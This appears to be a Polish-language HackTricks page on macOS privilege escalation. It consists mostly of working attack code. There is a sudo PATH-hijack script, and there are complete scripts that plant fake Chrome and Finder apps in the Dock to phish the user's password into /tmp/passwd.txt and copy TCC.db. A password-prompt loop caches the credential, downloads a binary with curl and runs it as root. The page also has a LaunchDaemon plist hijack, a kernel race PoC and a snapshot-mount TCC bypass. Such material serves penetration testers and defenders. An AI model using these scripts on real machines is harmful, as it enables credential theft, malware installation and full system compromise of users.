# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Jeśli przyszedłeś tu szukając TCC privilege escalation, przejdź do:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Zwróć uwagę, że **większość trików dotyczących privilege escalation wpływających na Linux/Unix będzie miała również wpływ na maszyny MacOS**. Zobacz:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interakcja z użytkownikiem

### Sudo Hijacking

Oryginalną [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) można znaleźć tutaj.

Jednak macOS **zachowuje** zmienną użytkownika **`PATH`** kiedy użyje on **`sudo`**. Oznacza to, że innym sposobem na przeprowadzenie tego ataku byłoby **hijack other binaries**, które ofiara uruchomi podczas **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Zwróć uwagę, że użytkownik korzystający z terminala bardzo prawdopodobnie będzie miał zainstalowany **Homebrew**. Z tego powodu możliwe jest przejęcie binarek w **`/opt/homebrew/bin`**.

### Dock Impersonation

Używając pewnej formy **social engineering** możesz **podszyć się na przykład pod Google Chrome** w Docku i w rzeczywistości uruchomić własny skrypt:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Kilka sugestii:

- Sprawdź w Docku, czy jest Chrome, i w takim przypadku **usuń** tę pozycję i **dodaj** **fałszywy** **wpis Chrome** na tej samej pozycji w Dock array.

<details>
<summary>Skrypt podszywania się pod Chrome w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Kilka sugestii:

- Nie możesz usunąć Findera z Docka, więc jeśli zamierzasz dodać go do Docka, możesz umieścić fałszywego Findera tuż obok prawdziwego. W tym celu musisz **dodać wpis fałszywego Findera na początku tablicy Dock**.
- Inną opcją jest nie umieszczać go w Docku i po prostu go otworzyć; "Finder asking to control Finder" nie jest aż tak dziwne.
- Inną opcją, aby **escalate to root without asking** hasła przy użyciu okropnego okienka, jest sprawić, by Finder naprawdę poprosił o hasło, aby wykonać uprzywilejowaną akcję:
- Poproś Findera, aby skopiował do **`/etc/pam.d`** nowy plik **`sudo`** (Monit o hasło wskaże, że "Finder wants to copy sudo")
- Poproś Findera, aby skopiował nowy **Authorization Plugin** (możesz kontrolować nazwę pliku, więc monit o hasło wskaże, że "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Złośliwe oprogramowanie często wykorzystuje interakcję z użytkownikiem, aby **przechwycić hasło uprawniające do sudo** i ponownie użyć go programowo. Typowy przebieg:

1. Zidentyfikuj zalogowanego użytkownika za pomocą `whoami`.
2. **Powtarzaj monity o hasło** aż `dscl . -authonly "$user" "$pw"` zwróci sukces.
3. Zbuforuj poświadczenie (np. `/tmp/.pass`) i wykonuj uprzywilejowane akcje za pomocą `sudo -S` (hasło przez stdin).

Przykładowy minimalny łańcuch:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Skradzione hasło można następnie ponownie użyć do **clear Gatekeeper quarantine with `xattr -c`**, skopiowania LaunchDaemons lub innych uprzywilejowanych plików oraz uruchomienia dodatkowych etapów nieinteraktywnie.

## Newer macOS-specific vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` still usable

`AuthorizationExecuteWithPrivileges` zostało zdeprecjonowane w 10.7, ale **wciąż działa na Sonoma/Sequoia**. Wiele komercyjnych updaterów wywołuje `/usr/libexec/security_authtrampoline` z niezaufaną ścieżką. Jeśli docelowy plik binarny jest zapisywalny przez użytkownika, możesz podłożyć trojana i skorzystać z legalnego monitu:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Połącz z **masquerading tricks above**, aby przedstawić wiarygodne okno dialogowe żądające hasła.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Jeśli LaunchDaemon plist lub cel w `ProgramArguments` jest **user-writable**, możesz uzyskać eskalację, podmieniając go, a następnie wymuszając przeładowanie launchd:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
To odzwierciedla wzorzec exploita opublikowany dla **CVE-2025-24085**, w którym zapisywalny plist został wykorzystany do uruchomienia kodu atakującego jako root.

### XNU SMR credential race (CVE-2025-24118)

Wyścig w `kauth_cred_proc_update` pozwala lokalnemu atakującemu skazić wskaźnik poświadczeń tylko do odczytu (`proc_ro.p_ucred`) przez rywalizację pętli `setgid()`/`getgid()` między wątkami aż do wystąpienia przerwanego `memcpy`. Udane skazenie skutkuje **uid 0** i dostępem do pamięci jądra. Minimalna struktura PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Sparuj to z heap grooming, aby umieścić kontrolowane dane tam, gdzie wskaźnik jest ponownie odczytywany. Na podatnych buildach jest to niezawodne **local kernel privesc** bez potrzeby obejścia SIP.

### Ominięcie SIP przez Migration assistant ("Migraine", CVE-2023-32369)

Jeśli masz już root, SIP nadal blokuje zapisy do lokalizacji systemowych. Błąd **Migraine** wykorzystuje uprawnienie Migration Assistant `com.apple.rootless.install.heritable`, aby uruchomić proces potomny, który dziedziczy obejście SIP i nadpisuje chronione ścieżki (np. `/System/Library/LaunchDaemons`). Ciąg:

1. Uzyskaj root na działającym systemie.
2. Wywołaj `systemmigrationd` ze spreparowanym stanem, aby uruchomić binarkę kontrolowaną przez atakującego.
3. Wykorzystaj odziedziczone uprawnienie, aby zmodyfikować pliki chronione przez SIP, tak aby zmiany przetrwały nawet po ponownym uruchomieniu.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 — klasa błędu)

Wiele daemonów Apple akceptuje obiekty **NSPredicate** przez XPC i jedynie weryfikuje pole `expressionType`, którym kontrolę ma atakujący. Poprzez skonstruowanie predicate, który ocenia dowolne selektory, można osiągnąć **code execution in root/system XPC services** (np. `coreduetd`, `contextstored`). W połączeniu z początkowym app sandbox escape daje to **privilege escalation without user prompts**. Szukaj punktów końcowych XPC, które deserializują predykaty i nie mają solidnego visitora.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (nawet nieuprzywilejowani) może utworzyć i zamontować time machine snapshot i **uzyskać dostęp DO WSZYSTKICH plików** tego snapshotu.\
Jedynym wymaganym uprzywilejowaniem jest to, żeby używana aplikacja (np. `Terminal`) miała **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), które musi zostać nadane przez administratora.

<details>
<summary>Zamontuj Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Dokładniejsze wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Wrażliwe informacje

To może być przydatne do eskalacji uprawnień:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Odniesienia

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
